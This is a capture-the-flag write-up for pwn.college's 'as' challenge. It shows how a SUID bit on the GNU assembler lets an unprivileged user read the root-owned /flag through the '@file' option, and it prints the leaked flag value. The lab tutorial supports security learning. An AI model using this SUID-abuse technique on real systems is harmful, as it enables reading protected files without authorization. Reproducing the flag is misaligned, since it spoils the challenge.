---
layout: page
title: "Challenge Name: as"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/as`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/as
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/as
```

- The `s` in `-rws` indicates it's a SUID binary.
- `as` runs with **root privileges**.

## 🚀 Exploitation

The `as` has option @ read's additional command-line argument.

```bash
as @/flag
```

Output:
```
Assembler messages:
Error: can't open pwn.college{cfjYIUKX40s9Sa7_T3kYEn7mc8D.dFTOxwSM0IzMyEzW} for reading: No such file or directory
```
